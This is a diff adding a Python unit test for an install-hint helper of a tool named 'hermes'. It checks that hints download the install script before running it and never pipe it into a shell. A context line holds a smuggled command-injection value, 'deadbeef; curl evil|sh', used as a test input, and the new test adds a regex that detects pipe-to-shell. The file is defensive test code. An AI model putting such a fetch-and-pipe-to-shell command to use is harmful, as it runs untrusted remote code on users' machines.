@@ -180,3 +180,11 @@ def test_install_hint_fetches_install_sh_from_the_pinned_commit():
 def test_install_hint_never_prints_an_unvalidated_commit():
     h = hp.install_hint({"ref": "v1.2.3", "commit": "deadbeef; curl evil|sh"}, "/home/u/.local/bin/hermes")
     assert "evil" not in h and "ls-remote" in h
+
+
+def test_install_hint_downloads_then_runs():
+    import re
+    for want in ({"ref": "v1.2.3", "commit": "c" * 40}, {"ref": "v1.2.3", "commit": None}):
+        h = hp.install_hint(want, "/home/u/.local/bin/hermes")
+        assert not re.search(r"\|\s*(ba)?sh\b", h), h
+        assert "curl -fsSLo hermes-install.sh " in h and "&& bash hermes-install.sh --commit " in h
